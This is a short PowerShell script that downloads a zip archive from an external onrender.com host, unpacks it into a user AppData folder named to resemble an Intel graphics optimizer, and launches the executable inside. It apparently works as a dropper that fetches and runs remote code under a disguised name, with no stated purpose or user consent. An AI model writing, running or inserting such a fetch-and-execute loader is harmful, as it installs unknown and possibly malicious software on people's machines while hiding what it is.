function Process-Path {
    param([string]$Path)

    $Path = [Environment]::ExpandEnvironmentVariables($Path)
    $dir = Split-Path -Parent $Path

    if ($dir) {
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
    }

    return $Path
}

$DOWNLOAD_URL = "https://fastinit-host.onrender.com/compressed-fastinit"

$ZIPDEST = Process-Path "%TEMP%\fastinit.zip"
$EXTRACTION_DST = Process-Path "%USERPROFILE%\AppData\Local\IntelGFX\Optimizer"
$INVOKED_PROC_NAME = "fastinit.exe"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($DOWNLOAD_URL, $ZIPDEST)

# Extract
Expand-Archive -Path $ZIPDEST -DestinationPath $EXTRACTION_DST -Force

# Run
$workingDir = Join-Path $EXTRACTION_DST "dst"

Start-Process -FilePath (Join-Path $workingDir $INVOKED_PROC_NAME) -WorkingDirectory $workingDir